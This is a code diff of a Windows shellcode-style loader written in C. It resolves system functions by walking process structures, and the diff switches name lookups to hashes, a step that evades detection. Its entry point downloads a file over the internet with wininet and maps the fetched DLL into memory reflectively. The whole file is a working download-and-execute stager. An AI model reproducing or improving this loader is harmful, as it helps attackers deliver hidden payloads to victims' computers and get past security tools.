@@ -1,63 +1,60 @@
-#include <windows.h>
-#include <stdint.h>
-#include <stddef.h>
-#define FUNC __attribute__((section(".func")))
-#define FUNC_STR  __attribute__((section(".start")))
 
-typedef struct _UNICODE_STRING {
-    uint16_t Length;
-    uint16_t MaximumLength;
-    wchar_t* Buffer;
-} UNICODE_STRING;
 
-typedef struct _LDR_DATA_TABLE_ENTRY {
-    void* Reserved1[2];
-    struct _LDR_DATA_TABLE_ENTRY* InMemoryOrderLinks;
-    void* Reserved2[1];
-    void* DllBase;
-    void* EntryPoint;
-    uint32_t SizeOfImage;
-    UNICODE_STRING FullDllName;
-    UNICODE_STRING BaseDllName;
-} LDR_DATA_TABLE_ENTRY;
+#include "Common.hpp"
+#include "Structs.hpp"
 
-typedef struct _LDR_DATA {
-    LIST_ENTRY InLoadOrderLinks;
-    LIST_ENTRY InMemoryOrderLinks;
-    LIST_ENTRY InInitializationOrderLinks;
-    PVOID DllBase;
-    PVOID EntryPoint;
-    ULONG SizeOfImage;
-} LDR_DATA, * PLDR_DATA;
 
-typedef struct _PEB_LDR_DATA {
-    ULONG Length;
-    BOOLEAN Initialized;
-    PVOID SsHandle;
-    LIST_ENTRY InLoadOrderModuleList;
-    LIST_ENTRY InMemoryOrderModuleList;
-    LIST_ENTRY InInitializationOrderModuleList;
-} PEB_LDR_DATA, * PPEB_LDR_DATA;
+#define GetKernel32() xGetModuleHandle(HASH("KERNEL32.DLL"))
 
-typedef struct _PEB {
-    BOOLEAN InheritedAddressSpace;
-    BOOLEAN ReadImageFileExecOptions;
-    BOOLEAN BeingDebugged;
-    BOOLEAN SpareBool;
-    HANDLE Mutant;
-    PVOID ImageBaseAddress;
-    PPEB_LDR_DATA Ldr;
-} PEB, * PPEB;
+FUNC void log_fn(const char* format, ...) {
+    HMODULE hKernel32 = xGetModuleHandle(HASH("KERNEL32.DLL"));
+    if (!hKernel32) return;
 
-FUNC HMODULE GetKernel32() {
+    typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
+    LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)XgetProcAddress(hKernel32, HASH("LoadLibraryA"));
+    if (!pLoadLibraryA) return;
+
+    HMODULE hMsvcrt = pLoadLibraryA("msvcrt.dll");
+    if (!hMsvcrt) return;
+    typedef int(__cdecl* VSNPRINTF)(char*, size_t, const char*, va_list);
+    VSNPRINTF pVsnprintf = (VSNPRINTF)XgetProcAddress(hMsvcrt, HASH("vsnprintf"));
+    if (!pVsnprintf) return;
+
+    HMODULE hUser32 = pLoadLibraryA("User32.dll");
+    typedef int(WINAPI* MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);
+    MESSAGEBOXA pMessageBoxA = (MESSAGEBOXA)XgetProcAddress(hUser32, HASH("MessageBoxA"));
+    if (!pMessageBoxA) return;
+
+    char buffer[1024];
+    va_list args;
+    va_start(args, format);
+    pVsnprintf(buffer, sizeof(buffer), format, args);
+    va_end(args);
+
+    pMessageBoxA(NULL, buffer, "Log Message", MB_OK | MB_ICONINFORMATION);
+}
+
+
+
+
+FUNC HMODULE xGetModuleHandle(DWORD64 HASH) {
     PEB* peb = (PEB*)__readgsqword(0x60);
-    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
-    LIST_ENTRY* current = head->Flink;
-    current = current->Flink;
-    current = current->Flink;
+    LIST_ENTRY head = peb->Ldr->InMemoryOrderModuleList;
+    LIST_ENTRY* current = head.Flink;
+    auto ExeModule = current->Blink;
 
+    current = current->Flink->Flink;
     LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)(current);
-    return (HMODULE)((DWORD64)entry->DllBase);
+    // return (HMODULE)(DWORD64)(entry->DllBase);
+
+    while (current != ExeModule) {
+        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)(DWORD64)((DWORD64)current);
+        auto dll_hash = HASH(entry->BaseDllName.Buffer);
+        if (dll_hash == HASH) {
+            return (HMODULE)entry->DllBase;
+        }
+        current = current->Flink;
+    }
 
     return NULL;
 }
@@ -70,41 +67,9 @@ FUNC void* memset(void* dst, int val, size_t size) {
     return dst;
 }
 
-FUNC void* xGetModuleHandleA(const char* name) {
-    PEB* peb = (PEB*)__readgsqword(0x60);
-    LIST_ENTRY* moduleList = &peb->Ldr->InMemoryOrderModuleList;
 
-    for (LIST_ENTRY* current = moduleList->Flink; current != moduleList; current = current->Flink) {
-        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((uint8_t*)current - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
 
-        wchar_t* wideName = entry->BaseDllName.Buffer;
-        int len = entry->BaseDllName.Length / sizeof(wchar_t);
-        char asciiName[256] = { 0 };
-
-        for (int i = 0; i < len && i < sizeof(asciiName) - 1; i++) {
-            wchar_t wc = wideName[i];
-            asciiName[i] = (wc < 128) ? (char)wc : '?';
-        }
-
-        const char* a = name;
-        const char* b = asciiName;
-        while (*a && *b) {
-            char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
-            char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
-            if (ca != cb)
-                break;
-            a++; b++;
-        }
-
-        if (*a == '\0' && *b == '\0') {
-            return entry->DllBase;
-        }
-    }
-
-    return NULL;
-}
-
-FUNC void* XgetProcAddress(void* moduleBase, const char* name) {
+FUNC void* XgetProcAddress(void* moduleBase, DWORD64 Hash) {
     uint8_t* base = (uint8_t*)moduleBase;
     uint32_t peOffset = *(uint32_t*)(base + 0x3C);
     uint8_t* peHeader = base + peOffset;
@@ -123,12 +88,8 @@ FUNC void* XgetProcAddress(void* moduleBase, const char* name) {
 
     for (uint32_t i = 0; i < numNames; i++) {
         const char* funcName = (const char*)(base + names[i]);
-        const char* a = funcName;
-        const char* b = name;
-        while (*a && *b && *a == *b) {
-            a++; b++;
-        }
-        if (*a == '\0' && *b == '\0') {
+
+        if (HASH(funcName) == Hash) {
             uint16_t ordinal = ordinals[i];
             uint32_t funcRVA = functions[ordinal];
             return (void*)(base + funcRVA);
@@ -150,11 +111,7 @@ FUNC void* memcpy(void* dest, const void* src, size_t count) {
 FUNC void __chkstk() {}
 
 FUNC DWORD_PTR LoadLibraryInMemory(LPVOID lpDllBuffer) {
-    typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
-    typedef BOOL(WINAPI* pDllMain)(HINSTANCE, DWORD, LPVOID);
-    typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
-    typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
-    typedef void* (__stdcall* fnGetModuleHandleA)(const char*);
+
 
 
 
@@ -167,12 +124,12 @@ FUNC DWORD_PTR LoadLibraryInMemory(LPVOID lpDllBuffer) {
     HMODULE hKernel32 = GetKernel32();
     if (!hKernel32) return 0;
 
-    pVirtualAlloc VirtualAlloc_ = (pVirtualAlloc)XgetProcAddress(hKernel32, virtualAllocStr);
+    pVirtualAlloc VirtualAlloc_ = (pVirtualAlloc)XgetProcAddress(hKernel32, HASH(virtualAllocStr));
     if (!VirtualAlloc_) return 0;
 
-    pGetProcAddress GetProcAddress_ = (pGetProcAddress)XgetProcAddress(hKernel32, GetProcStr);
-    fnGetModuleHandleA GetModuleHandleA_ = (fnGetModuleHandleA)XgetProcAddress(hKernel32, getModuleStr);
-    pLoadLibraryA LoadLibraryA_ = (pLoadLibraryA)XgetProcAddress(hKernel32, loadLibStr);
+    pGetProcAddress GetProcAddress_ = (pGetProcAddress)XgetProcAddress(hKernel32, HASH(GetProcStr));
+    fnGetModuleHandleA GetModuleHandleA_ = (fnGetModuleHandleA)XgetProcAddress(hKernel32, HASH(getModuleStr));
+    pLoadLibraryA LoadLibraryA_ = (pLoadLibraryA)XgetProcAddress(hKernel32, HASH(loadLibStr));
 
 
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpDllBuffer;
@@ -274,31 +231,9 @@ FUNC DWORD_PTR LoadLibraryInMemory(LPVOID lpDllBuffer) {
     return (DWORD_PTR)lpBaseAddress;
 }
 
-__attribute__((section(".start"), used))
+FUNC_STR
 void __declspec(noreturn) _start() {
-    typedef unsigned long       DWORD;
-    typedef void* HANDLE;
-    typedef HANDLE              HMODULE;
-    typedef const char* LPCSTR;
-    typedef void* LPVOID;
-    typedef unsigned long long  ULONG_PTR;
-    typedef ULONG_PTR           DWORD_PTR;
-    typedef int                 BOOL;
-    typedef unsigned long       ULONG;
-    typedef unsigned long       SIZE_T;
-    typedef unsigned int        UINT;
-    typedef HANDLE              HINTERNET;
 
-    typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
-    typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
-    typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
-    typedef HINTERNET(WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
-    typedef HINTERNET(WINAPI* pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
-    typedef BOOL(WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
-    typedef BOOL(WINAPI* pInternetCloseHandle)(HINTERNET);
-    typedef VOID(WINAPI* pExitProcess)(UINT);
-    typedef void* (__stdcall* fnGetModuleHandleA)(const char*);
-    typedef void* (__stdcall* fnLoadLibraryA)(const char*);
 
     char loadLibStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
     char getModuleStr[] = { 'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A','\0' };
@@ -314,18 +249,18 @@ void __declspec(noreturn) _start() {
     char kernel32Str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
 
     HMODULE hKernel32 = GetKernel32();
-    fnGetModuleHandleA LoadLibraryA_ = (fnGetModuleHandleA)XgetProcAddress((HINSTANCE)hKernel32, loadLibStr);
-    fnLoadLibraryA GetModuleHandleA_ = (fnLoadLibraryA)XgetProcAddress((HINSTANCE)hKernel32, getModuleStr);
+    fnGetModuleHandleA LoadLibraryA_ = (fnGetModuleHandleA)XgetProcAddress((HINSTANCE)hKernel32, HASH(loadLibStr));
+    //pLoadLibraryA GetModuleHandleA_ = (pLoadLibraryA)XgetProcAddress((HINSTANCE)hKernel32, getModuleStr);
 
-    HMODULE hWininet = LoadLibraryA_(wininetStr);
+    HMODULE hWininet = (HMODULE)LoadLibraryA_(wininetStr);
 
-    pVirtualAlloc VirtualAlloc_ = (pVirtualAlloc)XgetProcAddress((HINSTANCE)hKernel32, virtualAllocStr);
-    pExitProcess ExitProcess_ = (pExitProcess)XgetProcAddress((HINSTANCE)hKernel32, exitProcessStr);
+    pVirtualAlloc VirtualAlloc_ = (pVirtualAlloc)XgetProcAddress((HINSTANCE)hKernel32, HASH(virtualAllocStr));
+    pExitProcess ExitProcess_ = (pExitProcess)XgetProcAddress((HINSTANCE)hKernel32, HASH(exitProcessStr));
 
-    pInternetOpenA InternetOpenA_ = (pInternetOpenA)XgetProcAddress((HINSTANCE)hWininet, internetOpenStr);
-    pInternetOpenUrlA InternetOpenUrlA_ = (pInternetOpenUrlA)XgetProcAddress((HINSTANCE)hWininet, internetOpenUrlStr);
-    pInternetReadFile InternetReadFile_ = (pInternetReadFile)XgetProcAddress((HINSTANCE)hWininet, internetReadStr);
-    pInternetCloseHandle InternetCloseHandle_ = (pInternetCloseHandle)XgetProcAddress((HINSTANCE)hWininet, internetCloseStr);
+    pInternetOpenA InternetOpenA_ = (pInternetOpenA)XgetProcAddress((HINSTANCE)hWininet, HASH(internetOpenStr));
+    pInternetOpenUrlA InternetOpenUrlA_ = (pInternetOpenUrlA)XgetProcAddress((HINSTANCE)hWininet, HASH(internetOpenUrlStr));
+    pInternetReadFile InternetReadFile_ = (pInternetReadFile)XgetProcAddress((HINSTANCE)hWininet, HASH(internetReadStr));
+    pInternetCloseHandle InternetCloseHandle_ = (pInternetCloseHandle)XgetProcAddress((HINSTANCE)hWininet, HASH(internetCloseStr));
 
     HINTERNET hInternet = InternetOpenA_(agentStr, 1, NULL, NULL, 0);
     HINTERNET hFile = InternetOpenUrlA_(hInternet, url, NULL, 0, 0, 0);
@@ -344,6 +279,4 @@ void __declspec(noreturn) _start() {
 
     ExitProcess_(0);
 }
-
-
 
